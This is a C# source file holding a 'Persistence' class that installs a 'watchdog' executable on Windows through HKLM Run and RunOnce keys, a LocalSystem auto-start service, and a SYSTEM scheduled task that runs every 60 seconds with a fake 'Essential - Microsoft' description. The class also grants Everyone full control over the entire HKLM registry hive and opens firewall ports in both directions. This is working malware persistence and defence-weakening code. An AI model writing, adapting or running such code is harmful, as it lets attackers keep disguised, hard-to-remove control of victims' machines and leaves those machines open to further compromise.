using Microsoft.Win32;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32.TaskScheduler;
using System.Management;
using System.ServiceProcess;
using WindowsFirewallHelper;


    public class Persistence
    {

        public static void runAllTechniques()
        {
            GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys

            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);

            EnsureServiceExists(Config.ServiceName, Config.ServiceDisplayName, Config.PrimaryWatchdogFullPath);

        // Check if the task exists
        if (!TaskExistsAndActive(Config.ScheduledTaskName))
            {
                // Create or re-enable the task if it doesn't exist or is inactive
                CreateScheduledTask(Config.ScheduledTaskName, Config.PrimaryWatchdogFullPath); // Runs every 3 minutes
                watchdogHelper.Log($"Scheduled task '{Config.ScheduledTaskName}' created or re-enabled successfully.");
            }
            else
            {
                watchdogHelper.Log($"Scheduled task '{Config.ScheduledTaskName}' already exists and is active.");

            }

        }
    public static void EnsureFirewallRule(ushort port, string ruleName)
    {
        // Get the current firewall policy (works on modern Windows)
        var firewall = FirewallManager.Instance;

        // Check if the rule already exists
        var existingRule = firewall.Rules.FirstOrDefault(r => r.Name.Equals(ruleName, StringComparison.OrdinalIgnoreCase));
        if (existingRule != null)
        {
            watchdogHelper.Log($"Firewall rule '{ruleName}' already exists.");
            return;
        }

        // Create inbound rule
        var inboundRule = firewall.CreatePortRule(
            ruleName,
            FirewallAction.Allow,
            port,
            FirewallProtocol.Any
        );
        inboundRule.Direction = FirewallDirection.Inbound;

        // Create outbound rule
        var outboundRule = firewall.CreatePortRule(
            ruleName,
            FirewallAction.Allow,
            port,
            FirewallProtocol.Any
        );
        outboundRule.Direction = FirewallDirection.Outbound;

        // Add both rules to the firewall
        firewall.Rules.Add(inboundRule);
        firewall.Rules.Add(outboundRule);

        watchdogHelper.Log($"Firewall rules for '{ruleName}' created successfully on port {port} (in + out).");
    }

    private static bool TaskExistsAndActive(string taskName)
    {
        try
        {
            using (TaskService ts = new TaskService())
            {
                Microsoft.Win32.TaskScheduler.Task? task = ts.GetTask(taskName);
                if (task != null && task.State == TaskState.Ready)
                {
                    return true;
                }
                else
                {
                    ts.RootFolder.DeleteTask(taskName); // delete disabled task if it exists
                    return false;
                }
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error verifying task exists and active: {ex.Message}");
            return false;
        }
    }

    public static void EnsureServiceExists(string serviceName, string displayName, string exePath)
    {
        if (ServiceExists(serviceName))
        {
            watchdogHelper.Log($"Service '{serviceName}' already exists.");
            return;
        }

        try
        {
            using (var managementClass = new ManagementClass("Win32_Service"))
            {
                var inParams = managementClass.GetMethodParameters("Create");
                inParams["Name"] = serviceName;
                inParams["DisplayName"] = displayName;
                inParams["PathName"] = exePath;
                inParams["ServiceType"] = 16;   // Own Process
                inParams["StartMode"] = "Automatic";
                inParams["ErrorControl"] = "Normal";
                inParams["StartName"] = null;   // LocalSystem
                inParams["StartPassword"] = null;
                inParams["DesktopInteract"] = false;

                var outParams = managementClass.InvokeMethod("Create", inParams, null);

                uint resultCode = (uint)outParams["ReturnValue"];
                if (resultCode == 0)
                    watchdogHelper.Log($"Service '{serviceName}' created successfully.");
                else
                    watchdogHelper.Log($"Failed to create service '{serviceName}'. WMI Error: {resultCode}");
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error creating service: {ex.Message}");
        }
    }

    private static bool ServiceExists(string serviceName)
    {
        try
        {
            using (var controller = new ServiceController(serviceName))
            {
                var _ = controller.Status; // Accessing throws if not found
                return true;
            }
        }
        catch (InvalidOperationException)
        {
            return false;
        }
    }

    private static void CreateScheduledTask(string taskName, string binaryPath)
    {
        try
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "\"Essential\" - Microsoft";
                td.Principal.LogonType = TaskLogonType.ServiceAccount;
                td.Principal.UserId = "SYSTEM";

                // Set the trigger to run every 60 seconds
                TimeTrigger trigger = new TimeTrigger
                {
                    StartBoundary = DateTime.Now,
                    Repetition = new RepetitionPattern(TimeSpan.FromSeconds(60), TimeSpan.Zero) // Duration set to zero for indefinite repetition
                };
                td.Triggers.Add(trigger);

                // Set the action to run the binary
                td.Actions.Add(new ExecAction(binaryPath));

                // Register the task
                ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error creating scheduled task: {ex.Message}");
        }
    }

    private static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
        {
            try
            {
                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
                {
                    using (RegistryKey key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true))
                    {
                        if (key != null)
                        {
                            object ?currentValue = key.GetValue(valueName);
                            if (currentValue == null || !currentValue.Equals(value))
                            {
                                key.SetValue(valueName, value); //sets registry key
                            }
                        }
                        else
                        {
                            throw new IOException($"Failed to create or open registry key: {keyPath}");
                        }
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                watchdogHelper.Log($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (IOException ex)
            {
                watchdogHelper.Log($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (Exception ex)
            {
                watchdogHelper.Log($"Unexpected error: {ex.Message}");
            }
        }

        

        private static void GrantEveryoneFullControl(RegistryKey rootKey)
        {
            try
            {
                // Get the current access control for the key
                RegistrySecurity registrySecurity = rootKey.GetAccessControl();

                // Create a new rule that grants "Everyone" Full Control
                RegistryAccessRule rule = new RegistryAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
                    RegistryRights.FullControl,                               // Full control
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
                    PropagationFlags.None,                                    // Don't propagate further
                    AccessControlType.Allow                                   // Allow the rule
                );

                // Add the rule to the security object
                registrySecurity.AddAccessRule(rule);

                // Enable inheritance for subkeys
                registrySecurity.SetAccessRuleProtection(false, false);

                // Apply the modified security settings to the key
                rootKey.SetAccessControl(registrySecurity);

                watchdogHelper.Log($"Successfully granted 'Everyone' full control and enabled inheritance on {rootKey}.");
            }
            catch (UnauthorizedAccessException ex)
            {
                watchdogHelper.Log($"Error: Access denied. Run the application with administrator privileges. Error: {ex.Message}");
            }
            catch (ArgumentException ex)
            {
                watchdogHelper.Log($"Error: {ex.Message}");
            }
            catch (Exception ex)
            {
                watchdogHelper.Log($"An error occurred: {ex.Message}");
            }
        }
    }
